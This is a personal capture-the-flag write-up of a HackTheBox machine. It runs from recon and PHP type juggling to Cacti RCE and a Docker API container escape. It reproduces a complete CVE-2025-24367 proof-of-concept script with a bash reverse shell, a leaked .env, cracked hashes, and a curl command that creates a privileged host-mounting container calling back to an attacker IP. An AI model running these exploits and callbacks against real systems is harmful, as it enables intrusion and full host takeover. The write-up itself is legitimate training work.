
---

date: 2026-01-17
status: #completed
platform: [[HTB]]
difficulty: [[EASY]]
tags: [[Windows]]

---
# OUTPUT RESULTS FROM TOOLS
[[nmap 1]] -sV -sC 10.129.241.73
```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

[[whatweb]] http://monitorsfour.htb/
```bash
http://monitorsfour.htb/ [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[sales@monitorsfour.htb], HTTPServer[nginx], IP[10.129.241.73], JQuery, PHP[8.3.27], Script, Title[MonitorsFour - Networking Solutions], X-Powered-By[PHP/8.3.27], X-UA-Compatible[IE=edge], nginx
```

[[nikto]] -host http://monitorsfour.htb/ -Tuning 6
```bash
+ Server: nginx
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: Retrieved x-powered-by header: PHP/8.3.27.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 535 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2026-01-17 11:08:00 (GMT8) (170 seconds)
```

[[ffuf]] -u http://monitorsfour.htb/FUZZ -fc 403,404 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
```
login                   [Status: 200, Size: 4340, Words: 1342, Lines: 96, Duration: 268ms]
user                    [Status: 200, Size: 35, Words: 3, Lines: 1, Duration: 284ms]
contact                 [Status: 200, Size: 367, Words: 34, Lines: 5, Duration: 291ms]
static                  [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 306ms]
views                   [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 244ms]
controllers             [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 408ms]
forgot-password         [Status: 200, Size: 3099, Words: 164, Lines: 84, Duration: 307ms]
.env                    [Status: 200, Size: 97, Words: 1, Lines: 6, Duration: 245ms]
```

.env wget http://monitorsfour.htb/.env
```bash
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

session id
```http
> POST /api/v1/auth HTTP/1.1
< Set-Cookie: PHPSESSID=18d8827fdacd02e4eacf6881005e9b3c; path=/
```

user
```json
[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
```

[[ffuf]] -u http://monitorsfour.htb/admin/FUZZ -fc 403,404 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -H "Cookie: PHPSESSID=25955c3d5ad30ccc0d933bb6e63b619a"
```
changelog               [Status: 200, Size: 29797, Words: 13093, Lines: 514, Duration: 735ms]
api                     [Status: 200, Size: 8452, Words: 682, Lines: 203, Duration: 356ms]
users                   [Status: 200, Size: 41088, Words: 18395, Lines: 803, Duration: 274ms]
dashboard               [Status: 200, Size: 27526, Words: 1090, Lines: 641, Duration: 301ms]
customers               [Status: 200, Size: 390280, Words: 185778, Lines: 6466, Duration: 275ms]
invoices                [Status: 200, Size: 1337297, Words: 738980, Lines: 21805, Duration: 305ms]
tasks                   [Status: 200, Size: 1281774, Words: 574922, Lines: 17720, Duration: 409ms]
```
# Exploit

exploit.py [[cacti]]
```python
###########################################################
#                                                         #
# CVE-2025-24367 - Cacti Authenticated Graph Template RCE #
#         Created by TheCyberGeek @ HackTheBox            #
#             For educational purposes only               #    
#                                                         #
###########################################################

import argparse
import requests
import sys
import re
import time
import random
import string
import http.server
import os
import socketserver
import threading
from pathlib import Path
from urllib.parse import quote_plus
from bs4 import BeautifulSoup

SESSION = requests.Session()

"""
Custom HTTP logging class
"""
class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        if args[1] == '200':
            print(f"[+] Got payload: {self.path}")
        else:
            pass

"""
Web server class with start and stop functionalities in working directory
"""
class BackgroundHTTPServer:
    def __init__(self, directory, port=80):
        self.directory = directory
        self.port = port
        self.httpd = None
        self.server_thread = None

    def start(self):
        os.chdir(self.directory)
        handler = CustomHTTPRequestHandler
        self.httpd = socketserver.TCPServer(("", self.port), handler)
        self.server_thread = threading.Thread(target=self.httpd.serve_forever)
        self.server_thread.daemon = True
        self.server_thread.start()
        print(f"[+] Serving HTTP on port {self.port}")

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
            self.server_thread.join()
            print(f"[+] Stopped HTTP server on port {self.port}")

"""
Check if instance is Cacti
"""
def check_cacti(url: str) -> None:
    req = requests.get(url)
    if "Cacti" in req.text:
        print("[+] Cacti Instance Found!")
    else:
        print("[!] No Cacti Instance was found, exiting...")
        exit(1)
    
"""
Log into the Cacti instance
"""
def login(url: str, username: str, password: str, ip: str, port: int, proxy: dict | None) -> None:
    res = SESSION.get(url, proxies=proxy)
    match = re.search(r'var csrfMagicToken\s=\s"(sid:[a-z0-9]+,[a-z0-9]+)', res.text)
    csrf_magic_token = match.group(1)
    data = {
        '__csrf_magic': csrf_magic_token,
        'action': 'login',
        'login_username': username,
        'login_password': password
    }
    req = SESSION.post(url + '/cacti/index.php', data=data, proxies=proxy)
    if 'You are now logged into' in req.text:
        print('[+] Login Successful!')
        return True
    else:
        print('[!] Login Failed :(')
        http_server.stop()
        exit(1)

"""
Write bash payload
"""
def write_payload(ip: str, port: int) -> None:
    with open("bash", "w") as f:
        f.write(f"#!/bin/bash\nbash -i >& /dev/tcp/{ip}/{port} 0>&1")
        f.close()

"""
Get the template ID required for exploitation (Unix - Logged In Users)
"""
def get_template_id(url: str, proxy: dict | None) -> int:
    graph_template_search = SESSION.get(url + '/cacti/graph_templates.php?filter=Unix - Logged in Users&rows=-1&has_graphs=false', proxies=proxy)
    soup = BeautifulSoup(graph_template_search.text, "html.parser")
    elem = soup.find("input", id=re.compile(r"chk_\d+"))

    if elem:
        template_id = int(elem["id"].split("_")[1])
        print(f"[+] Got graph ID: {template_id}")
    else:
        print("[!] Failed to get template ID")
        http_server.stop()
        exit(1)

    return template_id

"""
Trigger the payload in multiple requests
"""
def trigger_payload(url: str, ip: str, stage: str, template_id: int, proxy: dict | None) -> None:    
    # Edit graph template
    graph_template_page = SESSION.get(url + f'/cacti/graph_templates.php?action=template_edit&id={template_id}', proxies=proxy)
    match = re.search(r'var csrfMagicToken\s=\s"(sid:[a-z0-9]+,[a-z0-9]+)', graph_template_page.text)
    csrf_magic_token = match.group(1)

    # Generate random filename
    get_payload_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + ".php"
    trigger_payload_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + ".php"

    # Change payload based on stage
    if stage == "write payload":
        print(f"[i] Created PHP filename: {get_payload_filename}")
        right_axis_label = (
            f"XXX\n"
            f"create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 "
            f"RRA:AVERAGE:0.5:1:1200\n"
            f"graph {get_payload_filename} -s now -a CSV "
            f"DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`curl\\x20{ip}/bash\\x20-o\\x20bash`;?>\n"
        )
    else:
        print(f"[i] Created PHP filename: {trigger_payload_filename}")
        right_axis_label = (
            f"XXX\n"
            f"create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 "
            f"RRA:AVERAGE:0.5:1:1200\n"
            f"graph {trigger_payload_filename} -s now -a CSV "
            f"DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`bash\\x20bash`;?>\n"
        )        

    data = {
        "__csrf_magic": csrf_magic_token,
        "name": "Unix - Logged in Users",
        "graph_template_id": template_id,
        "graph_template_graph_id": template_id,
        "save_component_template": "1",
        "title": "|host_description| - Logged in Users",
        "vertical_label": "percent",
        "image_format_id": "3",
        "height": "200",
        "width": "700",
        "base_value": "1000",
        "slope_mode": "on",
        "auto_scale": "on",
        "auto_scale_opts": "2",
        "auto_scale_rigid": "on",
        "upper_limit": "100",
        "lower_limit": "0",
        "unit_value": "",
        "unit_exponent_value": "",
        "unit_length": "",
        "right_axis": "",
        "right_axis_label": right_axis_label,
        "right_axis_format": "0",
        "right_axis_formatter": "0",
        "left_axis_formatter": "0",
        "auto_padding": "on",
        "tab_width": "30",
        "legend_position": "0",
        "legend_direction": "0",
        "rrdtool_version": "1.7.2",
        "action": "save"
    }

    # Update the template
    get_file = SESSION.post(url + '/cacti/graph_templates.php?header=false', data=data, allow_redirects=True, proxies=proxy)

    # Trigger execution
    trigger_write = SESSION.get(url + f'/cacti/graph_json.php?rra_id=0&local_graph_id=3&graph_start=1761683272&graph_end=1761769672&graph_height=200&graph_width=700')

    # Get payloads
    try:
        if stage == "write payload":
            res = SESSION.get(url + f'/cacti/{get_payload_filename}')
        else:
            res = SESSION.get(url + f'/cacti/{trigger_payload_filename}', timeout=2)
    except requests.Timeout:
        print("[+] Hit timeout, looks good for shell, check your listener!")
        return

    if "File not found" in res.text:
        print("[!] Exploit failed to execute!")
        http_server.stop()
        exit(1)      

"""
Main function to parse args and trigger execution
"""
if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='CVE-2025-24367 - Cacti Authenticated Graph Template RCE')
    parser.add_argument('-u', '--user', type=str, required=True, help='Username for login')
    parser.add_argument('-p', '--password', type=str, required=True, help='Password for login')
    parser.add_argument('-i', '--ip', type=str, required=True, help='IP address for reverse shell')
    parser.add_argument('-l', '--port', type=str, required=True, help='Port number for reverse shell')
    parser.add_argument('-url', '--url', type=str, required=True, help='Base URL of the application')
    parser.add_argument('--proxy', action='store_true', help='Enable proxy usage (default: http://127.0.0.1:8080)')
    args = parser.parse_args()
    proxy = {'http': 'http://127.0.0.1:8080'} if args.proxy else None
    check_cacti(args.url)
    http_server = BackgroundHTTPServer(os.getcwd(), 80)
    http_server.start()  
    login(args.url, args.user, args.password, args.ip, args.port, proxy)
    template_id = get_template_id(args.url, proxy)
    write_payload(args.ip, args.port)
    trigger_payload(args.url, args.ip, "write payload", template_id, proxy)
    trigger_payload(args.url, args.ip, "trigger payload", template_id, proxy)
    http_server.stop()
    Path("bash").unlink(missing_ok=True)
```

**sudo** python3 exploit.py -u marcus -p wonderful1 -url http://cacti.monitorsfour.htb -i 10.10.14.4 -l 4444  

# Discussion

This was one of the hardest "Easy" Machines i have encountered, actually i haven't done much on the HTB platform but wow.

Based from the initial nmap scan we have two open ports, on port 80, a nginx web app and on port 5985 wsman (Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)). port 5985 is used from windows remote management for HTTP communication, allowing remote management of windows machines. I focused on the port 80 since i don't know much on wsman, but based on research Miscrosoft HTTPAP/2.0 it has a vulnerability CVE-2024-41279 that can allow for information disclosure in the HTTP response header.

## Initial Reconnaissance
My initial reconnaissance always consists of whatweb, nikto, nmap, and ffuf. I didn't use feroxbuster on this machine since it is an nginx web app, based on my experience apache is the the technology i need to use feroxbuster on. I just filtered through the directories checking for information disclosure, based on the ffuf it returned an .env file on `monitorsfour.htb/`, ran wget on it and read it, it contained user credentials on database port on 3306 but from our nmap scan that port is not open, this can be a container that doesn't let us a reach that port. But since we have credentials, I can use this for other uses. now lets focus on other directories that we found from the fuzzing i did. After probing around the directories the only suspicious directory is /user which gives us a error code saying that we do not have a token or it is wrong. by using `?token=value` we can pass a value through. I got stuck here thinking that it might be the credentials I found earlier, after failed attempts over failed attempts I allowed myself to check online resources or hints. I found information that says that PHP 8.3.27 uses Type Juggling, it says that specific strings are treated as scientifc notation by PHP during loose comparison. So while thinking about what i would be doing i ran a subdomain fuzzing in the background to check if there is a subdomain of monitorsfour.htb. while that was running, I tried integer values and not strings, i first tried 0 and it gave me credentials of all logged in users. I tried logging in with the admin account with the password but it seems like the password is not the "password", it is a hash value since this is the standard for storing passwords and not storing plain text passwords. I ran it through a hash detector and based from the result it is an md5 hash, ran it through an md5 hash decrypter and it gave me "wonderful1". Logged in with the password, and success! I'm in the admin dashboard. With the results done, I also checked my running fuzzing on the sub domains and it showed cacti. cacti is an instance where i can execute RCE based from CVE-2024-43363.

## Initial Enumeration 
Now that we are in the parts we can get more information because we are in the web application as the admin, i got the PHPSESSID since based from the nikto scan we did in the initial recon it said that it was not created with the httponlyflag, meaning we can use it. I fuzzed directories with ffuf again, just checking if there are hidden details here. While running i manually probed around the directories in the admin dashboard, i first checked tasks and went all the way down. Didn't show me anything suspicious, until the changelog which shows the patches that was done on this web app. One of the key details on this page was migrating to docker desktop 4.44.2 meaning that we are inside a docker container, when we get to the point we need to access the system file we would need to breakout the container.

Other than that, there was no more details i deemed interesting. So i tried logging in with the cacti sub domain, i logged in using the credentials from admin, but did not work. But then i noticed that there was an appended line on to the admin credentials, which was marcus. So i tried logging in with marcus with wonderful1, success i logged in!

# Exploitation
After searching cacti vulnerabilities i saw an github repository which is https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC. I copied the exploit.py and ran it with the instructions on the readme.md. But basically what this does is that we can get a reverse shell when we run this. We can access the container but with no root privileges, so essentially we can get the user flag. After getting the user flag, I got lost. I kept asking myself how can I get root access? then it hit me, this is a docker container. To get full access to the system we need to break out of this container, but how? So i combed through the files that i can access within the user privileges. After gaining a low-privilege shell on the container as www-data, I began looking for ways to escalate. Remembering the changelog note about Docker Desktop 4.44.2, I checked for internal services and discovered an unauthenticated Docker API listening on 192.168.65.7:2375. Because this API was exposed without authentication, I was able to use curl to send a series of instructions to create a new, privileged container that mounted the host's actual root filesystem.

```bash
# 1. Create the privileged container
curl -X POST http://192.168.65.7:2375/containers/create -H "Content-Type: application/json" -d '{"Image": "alpine", "HostConfig": {"Binds": ["/:/host"], "Privileged": true, "NetworkMode": "host"}, "Cmd": ["sh", "-c", "chroot /host /bin/bash -c \"bash -i >& /dev/tcp/10.10.14.4/9001 0>&1\""]}'

# 2. Start the container using the ID returned above
curl -X POST http://192.168.65.7:2375/containers/<id>/start
```

Once the `nc` listener caught the connection, I had a root shell on the host machine, bypassing the container isolation entirely.

MonitorsFour demonstrated the "Information Disclosure to Full Compromise" pipeline. By exploiting PHP Type Juggling for initial access and leveraging a dangling Docker API for container escape, I was able to move from a simple web visitor to host root.

# Lessons Learned
- Always use strict comparisons in PHP to avoid type juggling
- The Docker socket/API is equivalent to root access; never expose it over a network without mutual TLS.    
- "Dangling" endpoints like `.env` files and unauthenticated APIs are the primary footholds for modern threat actors.